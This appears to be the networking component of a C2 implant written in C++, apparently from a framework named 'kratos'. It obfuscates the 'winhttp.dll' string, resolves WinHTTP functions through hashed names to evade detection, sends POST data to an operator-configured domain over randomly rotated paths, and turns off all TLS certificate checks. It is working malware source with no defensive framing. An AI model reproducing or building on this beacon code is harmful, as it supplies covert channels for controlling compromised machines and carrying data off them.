#include "net/net.h"
#include "agent/core.h"

NetMgr* net = NULL;

#define RECV_INTIAL_SIZE (64*1024)
#define RECV_MAX_SIZE    (1024 * 1024)


#define ARRAY_SIZE(a) (sizeof(a) / sizeof(a)[0])

NetMgr::NetMgr() {
	CHAR dll[ 12 ];
	dll[  0  ]  = 'w';
	dll[  1  ]  = 'i';
	dll[  2  ]  = 'n';
	dll[  3  ]  = 'h';
	dll[  4  ]  = 't';
	dll[  5  ]  = 't';
	dll[  6  ]  = 'p';
	dll[  7  ]  = '.';
	dll[  8  ]  = 'd';
	dll[  9  ]  = 'l';
	dll[ 10  ]  = 'l';
	dll[ 11  ]  = '\0';
	this->WinHttpDll = kratos->apis.LoadLibraryA( dll );

	if ( this->WinHttpDll ) {
		this->apis.WinHttpOpen               = ( decltype( this->apis.WinHttpOpen               ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpen"               ) );
		this->apis.WinHttpConnect            = ( decltype( this->apis.WinHttpConnect            ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpConnect"            ) );
		this->apis.WinHttpOpenRequest        = ( decltype( this->apis.WinHttpOpenRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpOpenRequest"        ) );
		this->apis.WinHttpSendRequest        = ( decltype( this->apis.WinHttpSendRequest        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpSendRequest"        ) );
		this->apis.WinHttpReadData           = ( decltype( this->apis.WinHttpReadData           ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReadData"           ) );
		this->apis.WinHttpCloseHandle        = ( decltype( this->apis.WinHttpCloseHandle        ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpCloseHandle"        ) );
		this->apis.WinHttpReceiveResponse    = ( decltype( this->apis.WinHttpReceiveResponse    ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpReceiveResponse"    ) );
		this->apis.WinHttpQueryDataAvailable = ( decltype( this->apis.WinHttpQueryDataAvailable ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpQueryDataAvailable" ) );
		this->apis.WinHttpSetOption          = ( decltype( this->apis.WinHttpSetOption          ) )api::GetProcAddress( this->WinHttpDll, HASH_STRA( "WinHttpSetOption"          ) );
		DEBUG_LOG("[+] Loaded winhttp dlls");
	}
	else {
		DEBUG_LOG("[!] Failed loading winhttp");
	}

	this->RecvBuf = ( PBYTE )kratos->apis.LocalAlloc( ALLOC_ARGS, RECV_INTIAL_SIZE );
	this->recvLen = 0;
	this->recvCap = RECV_INTIAL_SIZE;
	utils::mem::memset(this->Paths, 0, sizeof(this->Paths));


}



BOOL NetMgr::EnsureRecv( SIZE_T needed ) {
	if ( needed > RECV_MAX_SIZE ) { return FALSE; }
	
	if ( needed <= this->recvCap ) { return TRUE; }

	SIZE_T newCap = this->recvCap ? this->recvCap : RECV_INTIAL_SIZE;

	while ( newCap < needed ) {
		if ( newCap > RECV_MAX_SIZE / 2 ) {
			newCap = RECV_MAX_SIZE;
			break;
		}
		newCap *= 2;
	}

	PBYTE p = ( PBYTE )kratos->apis.LocalReAlloc( this->RecvBuf, newCap, ALLOC_ARGS );
	if ( ! p ) { return FALSE; }

	this->RecvBuf = p;
	this->recvCap = newCap;
	return TRUE;
}



BOOL NetMgr::Post( PBYTE data, SIZE_T DataSize ) {
	HINTERNET hRequest = NULL, hSession = NULL, hConnect = NULL;
	DWORD avail = 0, total = 0, read = 0, flags = 0, isSecure = 0;
	BOOL sent = FALSE;
	LPCWSTR path = L"/";

	INT32 start = 0;
	if ( this->TotalPaths > 0 ) {
		ULONG seed = kratos->apis.GetTickCount( );
		seed ^= ( ULONG )( ULONG_PTR )this;
		start = ( INT32 )( kratos->apis.RtlRandomEx( &seed ) % ( ULONG )this->TotalPaths );
		DEBUG_LOG( "[+] Using path index %d", start );
	}

	for (INT32 attempt = 0; attempt < this->TotalPaths; attempt++) {
		INT32 i = ( start + attempt ) % this->TotalPaths;

		hRequest = NULL;
		hSession = NULL;
		hConnect = NULL;
		avail = 0;
		total = 0;
		read = 0;
		flags = 0;
		isSecure = 0;
		sent = FALSE;

		hSession = this->apis.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
		if ( ! hSession ) { goto NEXT; }

		hConnect = this->apis.WinHttpConnect( hSession, this->Domain, this->Port, 0 );
		if ( ! hConnect ) { goto NEXT; }

		path = this->Paths[i];
		if ( this->isHttps ) {
			isSecure = WINHTTP_FLAG_SECURE;
			
		}

		hRequest = this->apis.WinHttpOpenRequest( hConnect, L"POST", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, isSecure );
		if ( ! hRequest) { goto NEXT; }
		if ( this->isHttps ) {
			flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
				    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
				    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
			this->apis.WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
		}

		if ( ! this->apis.WinHttpSendRequest( hRequest, NULL, 0, ( LPVOID )data, ( DWORD )DataSize, ( DWORD )DataSize, 0 ) ) {
			DEBUG_LOG("[+] Failed Sending Request");
			goto NEXT;
		}

		if ( ! this->apis.WinHttpReceiveResponse( hRequest, NULL ) ) { goto NEXT; }

		for ( ;; ) {
			if ( ! this->apis.WinHttpQueryDataAvailable(hRequest, &avail ) ) { goto NEXT; }

			if ( avail == 0 ) { break; }

			if ( ! this->EnsureRecv( total + avail ) ) { goto NEXT; }

			read = 0;
			if ( ! this->apis.WinHttpReadData( hRequest, this->RecvBuf + total, avail, &read ) ) { goto NEXT; }

			if (read == 0) { break; }
			total += read;
		}
		this->recvLen = total;
		sent = TRUE;
		
NEXT:
		if ( hRequest ) { this->apis.WinHttpCloseHandle( hRequest ); }
		if ( hConnect ) { this->apis.WinHttpCloseHandle( hConnect ); }
		if ( hSession ) { this->apis.WinHttpCloseHandle( hSession ); }
		if (sent) { return TRUE; }
	}
	return FALSE;
}



void NetMgr::Cleanup() {
	PBYTE recv = this->RecvBuf;
	this->RecvBuf = NULL;
	this->recvLen = 0;
	this->recvCap = 0;

	NetMgr* self = this;
	net = NULL;
	kratos->apis.LocalFree( recv );
	kratos->apis.LocalFree( self );
	return;
}


PBYTE NetMgr::Data( ) {
	return this->RecvBuf;
}

SIZE_T NetMgr::DataSize( ) {
	return this->recvLen;
}


BOOL NetMgr::SetHttpConfig(INT32 TotalPaths, PCHAR Domain, INT32 Port, BOOL isHttps, PCHAR* Paths) {

	INT size = kratos->apis.MultiByteToWideChar(CP_UTF8, 0, Domain, -1, NULL, 0);
	if ( size == 0 ) { return FALSE; }

	this->Domain = (PWCHAR)kratos->apis.LocalAlloc( ALLOC_ARGS, size * sizeof( WCHAR ) );
	if ( ! this->Domain ) { return FALSE; }

	if ( ! kratos->apis.MultiByteToWideChar(CP_UTF8, 0, Domain, -1, this->Domain, size ) ) {
		kratos->apis.LocalFree( this->Domain );
		return FALSE;
	}

	if (TotalPaths < 0 || TotalPaths > TOTAL_PATHS) {
		kratos->apis.LocalFree( this->Domain );
		return FALSE;
	}

	if (TotalPaths > 0 && Paths == NULL) {
		kratos->apis.LocalFree( this->Domain );
		return FALSE;
	}

	for (INT32 i = 0; i < TotalPaths; i++) {
		if (Paths[i] == NULL) {
			kratos->apis.LocalFree( this->Domain );
			return FALSE;
		}

		if (!kratos->apis.MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, Paths[i], -1, this->Paths[i], MAX_PATH_LEN)) {
			kratos->apis.LocalFree( this->Domain );
			return FALSE;
		}
	}
	this->TotalPaths = TotalPaths;
	this->isHttps    = isHttps;
	this->Port       = Port;
	return TRUE;
}
